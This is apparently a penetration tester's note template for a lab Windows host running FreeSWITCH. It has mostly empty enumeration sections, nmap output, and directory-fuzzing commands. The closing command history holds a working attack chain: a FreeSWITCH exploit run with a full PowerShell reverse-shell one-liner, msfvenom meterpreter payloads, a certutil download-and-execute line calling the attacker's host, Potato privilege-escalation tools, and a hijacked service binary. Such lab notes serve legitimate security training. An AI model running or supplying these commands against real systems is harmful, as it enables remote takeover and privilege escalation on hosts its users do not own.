# 192.168.x.143
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
`sudo find / -type f -iname "local.txt" 2>/dev/null`    
`sudo find / -type f -iname "proof.txt" 2>/dev/null`

- C:\Users\chris\Desktop\local.txt
- C:\Users\Administrator\Desktop\proof.txt

# Accounts
### username / password
`<connection method>`   
`whoami /priv`
```

```
`whoami /groups`
```

```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.204.151 --top-ports 1000`
```
ORT     STATE SERVICE          VERSION
80/tcp   open  http             Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
5060/tcp open  sip-proxy        FreeSWITCH mod_sofia 1.10.1~64bit
5080/tcp open  sip-proxy        FreeSWITCH mod_sofia 1.10.1~64bit
7443/tcp open  ssl/websocket    (WebSocket version: 13)
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
8081/tcp open  websocket        (WebSocket version: 13)
8082/tcp open  ssl/websocket    (WebSocket version: 13)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8081-TCP:V=7.95%I=7%D=6/18%Time=68534EAA%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,37,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nSec-WebSocket-Versio
SF:n:\x2013\r\n\r\n")%r(GenericLines,37,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nSec-WebSocket-Version:\x2013\r\n\r\n")%r(HTTPOptions,37,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nSec-WebSocket-Version:\x2013\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8082-TCP:V=7.95%T=SSL%I=7%D=6/18%Time=68534EBF%P=x86_64-pc-linux-gn
SF:u%r(GenericLines,37,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nSec-WebSocke
SF:t-Version:\x2013\r\n\r\n")%r(GetRequest,37,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nSec-WebSocket-Version:\x2013\r\n\r\n")%r(HTTPOptions,37,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nSec-WebSocket-Version:\x2013\r\n\r\n
SF:");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
`sudo nmap -A -T4 -p- 192.168.204.151`
```


```
## Local Users
`Get-LocalUser`
```

```
## Local Groups
`Get-LocalGroup`
```

```
## System Info
`systeminfo`
```

```
## Routes
`route print`
```

```
## Netstat
`netstat -ano`
```

```
## Environment Vars
`Get-ChildItem Env:`
```

```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.133.143:80/api/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
```

```

`gobuster dir -u http://192.168.133.143:80/api/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -b 403`
```
```

`ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.133.143/FUZZ`
```

```
`ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://192.168.133.143/FUZZ`
```
```

# Command History
```c
nc -lvnp 4444

python3 ./47799.py 192.168.148.151 'powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(\"192.168.45.185\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"'

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.185 LPORT=4444 -f exe -o shell.exe

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.45.186
set LPORT 4444
run

python3 ./47799.py 192.168.148.151 'certutil -urlcache -split -f http://192.168.45.185/shell2.exe shell2.exe && shell2.exe'

// get meterpreter session

getuid

upload SigmaPotato.exe



RoguePotato.exe -r 192.168.45.186 -e "C:\windows\system32\cmd.exe" -l 9999


msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.185 LPORT=9999 -f exe -o KiteService2.exe

upload KiteService.exe
move to C:\Program Files\Kite
nc -lvnp 9999

net stop KiteService
net start KiteService

//get reverse shell

```